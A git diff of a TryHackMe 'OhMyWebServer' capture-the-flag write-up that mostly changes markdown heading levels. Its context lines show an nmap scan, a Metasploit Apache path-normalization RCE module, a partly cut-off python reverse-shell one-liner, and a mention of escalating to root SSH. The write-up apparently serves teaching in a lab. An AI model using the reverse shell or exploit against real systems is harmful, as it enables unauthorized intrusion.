@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/ohmyweb
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [OhMyWebServer](https://tryhackme.com/room/ohmyweb) from [TryHackMe](https://tryhackme.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -53,7 +53,7 @@ Searching on [exploit-db](https://www.exploit-db.com/) we find that this apache 
 
 ![](1.png)
 
-# **Foothold**
+## **Foothold**
 
 There is a metasploit module available to exploit this vulnerability called `exploit/multi/http/apache_normalize_path_rce`, let's use it and set the options.
 
@@ -76,7 +76,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![](3.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 We can see that we're a docker container from the name of the host and from the hidden directory in root `/`.
 
@@ -163,12 +163,6 @@ Now we can ssh into the machine as root without a password.
 
 ![](8.png)
 
-
-
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
